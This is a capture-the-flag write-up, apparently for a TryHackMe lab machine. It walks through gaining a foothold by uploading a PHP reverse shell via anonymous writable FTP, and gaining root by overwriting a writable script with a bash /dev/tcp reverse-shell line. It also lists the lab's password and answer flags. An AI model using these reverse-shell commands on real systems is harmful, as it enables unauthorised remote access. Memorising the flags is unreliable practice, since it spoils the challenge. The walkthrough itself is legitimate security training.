## Target: 10.81.140.92
### Recon
**Nmap:** `rustscan -a 10.81.140.92 -- -A`
### Enumeration
**Open Ports:**
21/tcp open  ftp     syn-ack vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| drwxrwxrwx    2 65534    65534        4096 Nov 12  2020 ftp [NSE: writeable]
| -rw-r--r--    1 0        0          251631 Nov 12  2020 important.jpg
|-rw-r--r--    1 0        0             208 Nov 12  2020 notice.txt
22/tcp open  ssh     syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack Apache httpd 2.4.18 ((Ubuntu))

**Web Findings:**
Port 80 takes us to a page explaining that the site is under construction. Mailto link takes us nowhere. 
### Vulnerabilities
A dirsearch search gives us a page called /files, which exposes the FTP server to HTTP. 
Perhaps we can upload a PHP reverse shell to FTP and execute it over HTTP.
### Exploitation
`ftp> put php-reverse-shell.php`
We set up a nc listener and navigate to the reverse shell on HTTP. Boom, shell. We upgrade the terminal with python. 
### Post Exploitation
In the / directory we find a file called `recipe.txt`, which gives us one of the clues. 
There is a _lennie_ home directory, but we do not have permission to access it.
After a lot of hunting around uncovers a directory called _Incidents_, with a suspicious pcap file in it. Some hunting in that file reveals a potential password for _lennie_.
`us - lennie` with our newfound password works and we are now _lennie_.
Lennie's home directory contains the user flag, as well as a folder called `scripts`.
### Privilege Escalation
Lennie unfortunately cannot run sudo.
`sripts` has a file in it called `planner.sh` owned by root with a short bash script inside of it. Unfortunately, we only have read and execute permissions for the file, no write permissions. However, the file executes another script called `print.sh` in /etc and it turns out that we DO have write access to that file.
All we have to do is replace the contents of the `print.sh` file with a simple bash reverse shell and we will pop a root shell.
`/bin/bash -i >& /dev/tcp/10.81.66.220/4443 0>&1`
We start a nc listener on 4443 and then execute the `planner.sh` file.

Root!
### Flags
- lennie pass: _c4ntg3t3n0ughsp1c3_
- User: _THM{03ce3d619b80ccbfb3b7fc81e46c0e79}_
- Root: _THM{f963aaa6a430f210222158ae15c3d76d}_
### Notes
There were multiple times during doing this machine where I was tempted to look at a guide. However, going the extra mile before doing that paid off in each instance. 